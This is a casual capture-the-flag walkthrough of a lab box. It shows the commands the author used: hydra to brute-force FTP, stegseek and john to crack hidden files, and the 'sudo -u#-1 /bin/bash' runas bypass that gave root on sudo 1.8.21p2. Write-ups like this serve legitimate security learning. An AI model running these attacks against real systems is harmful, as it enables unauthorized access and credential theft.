Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R

so the website said to visit the website as the code name

i have an extention installed which can change user-agent manually

i started changing the user agent or you can also use burp to change user agent field

and got a redirection in C useragent after that i got redirected on this http://10.10.124.184/agent_C_attention.php

and the data was : 

Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 

tried to brutforce ftp password with this


hydra -l chris -P ~/Desktop/payloads/wordlist/rockyou.txt 10.10.124.184 ftp -t63 -Vv -I


got password as crystal



and downloaded all the files present in the directory after that

i got 3 files there was one .jpg , .png , .txt

the .png file was the blackhole file i wasted i hour on that lol but then i tried cracking the .jpg file with steg seek 

stegseek -sf cute-alien.jpg -wl rockyou.txt -xf hello

and i got the password : area51

and i found the files

Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris


i got the password now logged in into ssh 


directly after logging into the machine i typed sudo -l

and then i saw this

 (ALL, !root) /bin/bash


i remebered this vuln in one of the thm box

and looked for the sudo version and looked that vuln

Sudo version 1.8.21p2

exploit was : sudo -u#-1 /bin/bash


and i got  root




as i havent done one of the question that is opening a zip file 
yeah you are right the .png file isnt a black hole 

i tried to binwalk the file first by binwal -e thepngfile

and i got a zip ffile in it tried to unzip it using

unzip file 

but didnt succeded as showing some error idk why then i did opened the file by  using 7zip

by "7z x file"

it asked me for a password 

i cracked the password by using jtr


zip2john > hash

john --format=zip hash

this cracked the password i got to see the passsword by

john hash --show

it was alien after that i read the context of the file which showed some random character which was passsword for a file idk which one

tried analyze it using hash analyser

https://www.tunnelsup.com/hash-analyzer/


it was base64 decoded it by using

echo QXJlYTUx | base64 -d

and the plain text was area51 which was actually password for the jpg file which we already cracked using the stegseeek lol!!!


btw cheers for the root user! thanks
